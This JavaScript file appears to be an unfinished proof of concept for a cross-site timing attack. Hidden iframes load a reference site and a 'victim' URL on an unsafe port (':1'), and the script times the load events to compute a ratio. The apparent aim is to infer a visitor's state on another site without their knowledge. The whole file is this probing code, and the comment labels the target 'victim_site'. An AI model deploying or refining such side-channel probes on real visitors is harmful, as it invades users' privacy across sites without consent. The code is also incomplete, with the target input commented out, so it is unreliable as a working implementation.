const invisible_div = document.getElementById("invisible");
const form = document.getElementById("monitor");
const ref_site_2 = "https://sv.cmu.edu/";
const ref_site_1 = "https://getbootstrap.com/";

form.addEventListener("submit", async function (e) {
  e.preventDefault();
  // const vtm_site = form.site.value;
  const { r_np, r_bg } = await load_baseline_result();
  // console.log("vtm_site");
  console.log("r_np, r_bg ", r_np, r_bg);
});

async function equation_one(tg_url) {
  let time_0 = performance.now(); // timestamp click the start to monitor
  let time_ref; // reference_site loaded timestamp
  let time_vtm; // reference_site loaded timestamp
  let r; // (time_vtm - time_ref) / (time_ref - time_0);

  const ref_1 = "ref_1";
  create_invisible_iframe(ref_1);
  const ref_frame_1 = document.getElementById(ref_1);
  ref_frame_1.addEventListener("load", () => {
    time_ref = performance.now();
  });
  const tg = "tg";
  create_invisible_iframe(tg);
  const tg_frame = document.getElementById(tg);
  document.getElementById(tg).addEventListener("load", () => {
    time_vtm = performance.now();
  });
  await loadURLonFrame(ref_site_1, ref_frame_1);
  await awaitEvent(ref_frame_1, "load");
  await loadURLonFrame(tg_url, tg_frame);
  await awaitEvent(tg_frame, "load");

  r = (time_vtm - time_ref) / (time_ref - time_0);

  console.log("[equation_one]: {time_0, time_ref, time_vtm, r}", {
    time_0,
    time_ref,
    time_vtm,
    r,
  });
  return { time_0, time_ref, time_vtm, r };
}

async function load_baseline_result() {
  const { r: r_np } = await equation_one(ref_site_2);
  await awaitReset();
  const { r: r_bg } = await equation_one(ref_site_2);
  return { r_np, r_bg };
}

function create_invisible_iframe(id) {
  const inv_iframe = document.createElement("iframe");
  inv_iframe.setAttribute("id", id);
  invisible_div.appendChild(inv_iframe);
}
/*
loading a URL: loading a URL with an unsafe port(port1, 22, 23, 24)
victim_site.com = vtm
*/
function loadURLonFrame(url, frame) {
  return new Promise((resolve) => {
    frame.setAttribute("src", `${url}:1`);
    resolve();
  });
}
function awaitReset() {
  return new Promise((resolve) => {
    invisible_div.innerHTML = "";
    resolve();
  });
}

function awaitEvent(element, eventName) {
  return new Promise((resolve) => {
    element.addEventListener(
      eventName,
      () => {
        resolve();
      },
      { once: true }
    );
  });
}
